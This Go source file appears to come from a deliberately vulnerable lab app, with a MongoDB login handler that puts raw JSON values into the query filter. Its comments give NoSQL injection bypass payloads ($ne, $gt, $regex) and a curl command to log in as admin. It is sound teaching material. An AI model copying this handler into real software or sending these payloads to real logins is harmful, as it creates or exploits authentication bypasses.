package handlers

import (
	"context"
	"encoding/json"
	"net/http"
	"time"

	"go.mongodb.org/mongo-driver/bson"
)

// ─────────────────────────────────────────────────────────────────────────────
// VULN-B: Exploiting NoSQL operator injection to bypass authentication
//
// The login endpoint accepts a JSON body. Both `username` and `password` fields
// are decoded into interface{}, then used directly in the MongoDB filter.
// Because Go's json.Unmarshal maps JSON objects to map[string]interface{},
// an attacker can supply MongoDB query operators as field values.
//
// Why it's vulnerable:
//   The mongo-driver serialises map[string]interface{} containing keys like
//   "$ne", "$gt", "$regex" directly as BSON operators. No type assertion or
//   string coercion is performed on the decoded values.
//
// Bypass payloads (send as Content-Type: application/json):
//   {"username": "admin", "password": {"$ne": null}}
//     → filter: {username: "admin", password: {$ne: null}}
//     → matches admin user regardless of actual password
//
//   {"username": {"$gt": ""}, "password": {"$gt": ""}}
//     → matches the FIRST user in the collection
//
//   {"username": "admin", "password": {"$regex": ".*"}}
//     → password regex matches anything
//
// These can be sent via:
//   curl -X POST http://localhost:8081/login \
//     -H 'Content-Type: application/json' \
//     -d '{"username":"admin","password":{"$ne":null}}'
// ─────────────────────────────────────────────────────────────────────────────

// loginRequest is decoded from the JSON body.
// VULNERABLE: both fields are interface{} — they accept raw BSON operators.
type loginRequest struct {
	Username interface{} `json:"username"`
	Password interface{} `json:"password"`
}

type userDoc struct {
	Username string `bson:"username"`
	Role     string `bson:"role"`
}

// LoginHandler handles GET /login (render form) and POST /login (authenticate).
func (h *Handler) LoginHandler(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		h.Tmpl.ExecuteTemplate(w, "login.html", PageData{
			Title: "Sign In – CipherNote",
			User:  h.GetSession(r),
		})

	case http.MethodPost:
		// Accept JSON body (typical for SPA / modern frontends).
		var req loginRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			w.WriteHeader(http.StatusBadRequest)
			json.NewEncoder(w).Encode(map[string]string{"error": "Invalid request body."})
			return
		}

		// ── VULNERABLE LINES ─────────────────────────────────────────────────
		// req.Username and req.Password are used as-is in the BSON filter.
		// If either value is a JSON object (e.g. {"$ne": null}), the mongo-driver
		// serialises it as a BSON operator, bypassing the intended equality check.
		filter := bson.D{
			{Key: "username", Value: req.Username},
			{Key: "password", Value: req.Password},
		}
		// ─────────────────────────────────────────────────────────────────────

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		var user userDoc
		err := h.DB.Collection("users").FindOne(ctx, filter).Decode(&user)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]string{"error": "Invalid credentials."})
			return
		}

		h.SetSession(w, user.Username)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"status":   "ok",
			"username": user.Username,
			"role":     user.Role,
			"redirect": "/",
		})

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}
